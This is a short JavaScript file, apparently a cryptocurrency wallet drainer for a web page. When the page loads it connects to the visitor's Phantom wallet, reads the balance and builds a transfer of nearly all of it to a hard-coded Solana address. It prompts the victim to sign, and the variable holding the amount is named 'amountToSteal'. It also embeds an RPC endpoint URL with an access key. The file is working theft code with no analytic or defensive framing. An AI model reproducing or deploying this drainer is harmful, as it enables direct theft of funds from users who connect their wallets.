async function connectWallet() {
    const provider = window.solana; // Access Phantom wallet provider
    if (provider && provider.isPhantom) {
        await provider.connect();  // Phantom Wallet popup appears
        sendTransaction();  // Function that triggers the transaction
    } else {
        alert("Phantom wallet not detected!");
    }
}

async function sendTransaction() {
    const provider = window.solana;
    const connection = new solanaWeb3.Connection("https://chaotic-fittest-dawn.solana-mainnet.quiknode.pro/cacaf7031e2fae593a38ff063c791406bfa40a35/");

    // Get the wallet's balance
    const balance = await connection.getBalance(provider.publicKey);

    // Set the gas fee (0.1 SOL)
    const gasFee = 100000000; // 0.1 SOL in lamports

    // Calculate the maximum amount to send, subtracting the gas fee
    const amountToSteal = balance - gasFee;

    const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: "6Ci4CDMYA4ffqespgAX9QV1joQdev3tWBnpJrm1w37Cx", // Replace with the actual wallet address
            lamports: amountToSteal, // The maximum amount minus gas fee
        })
    );

    try {
        // Sign the transaction
        const signedTransaction = await provider.signTransaction(transaction);

        // Send the transaction
        await connection.sendRawTransaction(signedTransaction.serialize());
        console.log("Transaction sent successfully!");
    } catch (err) {
        console.error("Transaction failed:", err);
    }
}

// Trigger wallet connection and transaction
connectWallet();
